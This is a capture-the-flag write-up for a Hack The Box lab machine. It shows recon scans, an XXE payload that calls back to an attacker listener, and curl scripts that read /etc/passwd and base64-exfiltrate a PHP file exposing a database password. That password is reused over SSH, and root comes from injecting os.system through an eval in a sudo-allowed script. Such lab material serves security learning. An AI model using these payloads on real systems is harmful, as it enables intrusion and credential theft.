> Author: **[ejedev][author-profile]**

## Discovery

Nmap and Gobuster return:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
```

```bash
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/db.php               (Status: 200) [Size: 0]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/index.php            (Status: 200) [Size: 25169]
/portal.php           (Status: 200) [Size: 125]
/server-status        (Status: 403) [Size: 277]
```

There's a README in the resources:

```
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

A business website is served on port 80. Its portal redirects to `log_submit.php`,
a tool for employees to submit bugs.

Upon submission, Burpsuite captures a POST request to `tracker_diRbPr00f314.php`,
with base64 encoded xml data:

```javascript
// "<?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?>\n\t\t<bugreport>\n\t\t<title>heyhey</title>\n\t\t<cwe>inject some clever code here</cwe>\n\t\t<cvss>-1</cvss>\n\t\t<reward>');show tables;#</reward>\n\t\t</bugreport>"
atob("PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5oZXloZXk8L3RpdGxlPgoJCTxjd2U+aW5qZWN0IHNvbWUgY2xldmVyIGNvZGUgaGVyZTwvY3dlPgoJCTxjdnNzPi0xPC9jdnNzPgoJCTxyZXdhcmQ+Jyk7c2hvdyB0YWJsZXM7IzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg==");
```

This might be exploitable!

## Checking for XXE

Let's export this previous request as a curl command (in Burpsuite) to tweak it:

```bash
curl -i -s -k -X $'POST' --compressed \
    -H $'Host: 10.10.11.100' \
    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
    -H $'Accept-Encoding: gzip, deflate' \
    --data-urlencode $'data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5oZXloZXk8L3RpdGxlPgoJCTxjd2U+aW5qZWN0IHNvbWUgY2xldmVyIGNvZGUgaGVyZTwvY3dlPgoJCTxjdnNzPi0xPC9jdnNzPgoJCTxyZXdhcmQ+Jyk7c2hvdyB0YWJsZXM7IzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg==' \
    $'http://10.10.11.100/tracker_diRbPr00f314.php'
```

> Don't forget the --compressed flag, otherwise the response body will not appear.

> Also, switching the `--data-binary` option to `--data-urlencode` allows to paste
> base64 data directly, and not worry about special characters like "=".

Then, test whether external entities are enabled with:

```bash
echo $'<?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?>\n\t\t<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.16.30:9876"> %xxe; ]>\n\t\t<bugreport>\n\t\t<title>heyhey</title>\n\t\t<cwe>inject some clever code here</cwe>\n\t\t<cvss>-1</cvss>\n\t\t<reward>a XXE?</reward>\n\t\t</bugreport>' | base64 -w 0
```

Netcat catches a request on port 9876: looks like we have a XXE on our hands!

## Scripting the attack

Let's put together a script to automate the testing:

```bash
HEADER=$'<?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?>'
REPORT=$'<bugreport><title>user listing</title><cwe>xxe</cwe><cvss>pwned</cvss><reward>&flag;</reward></bugreport>'
PAYLOAD=$'<!DOCTYPE foo [<!ENTITY flag SYSTEM \"/etc/passwd\"> ]>'
DATA=$(echo "${HEADER}${PAYLOAD}${REPORT}" | base64 -w 0)

curl -i -s -k -X $'POST' --compressed \
    -H $'Host: 10.10.11.100' \
    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
    -H $'Accept-Encoding: gzip, deflate' \
    --data-urlencode "data=${DATA}" \
    $'http://10.10.11.100/tracker_diRbPr00f314.php'
```

From the response, the target has two users: root and development.

## Breaking-in

The XXE can be used to download files; the `db.php` seen in recon is the most promising:

```bash
PAYLOAD=$'<!DOCTYPE foo [<!ENTITY flag SYSTEM \"php://filter/convert.base64-encode/resource=db.php\"> ]>'
```

Decoding it gives us credentials:

```php
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
```

According to the previous port scanning, there's no mysql server exposed:

```bash
# ERROR 2002 (HY000): Can't connect to server on '10.10.11.100' (115)
mysql -D'bounty' -u'admin' -p'm19RoAU0hP41A1sTsq6K' -h 10.10.11.100 -e'show tables;'
```

But it works as ssh credentials for the user "development"!

## Escalation

The user "development" can elevate his privileges thanks to sudo and run
`/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` as root.

The script parses a markdown ticket and evaluates its "code" section:

```python
validationNumber = eval(x.replace("**", ""))
```

Following the parsing rules, we create a ticket to require the root flag:

```markdown
# Skytrain Inc
## Ticket to root the box
__Ticket Code:__
**102+__import__('os').system('cat /root/root.txt')**
## Issued: 2021/08/19
# End Ticket
```

[author-profile]: https://app.hackthebox.eu/users/280547
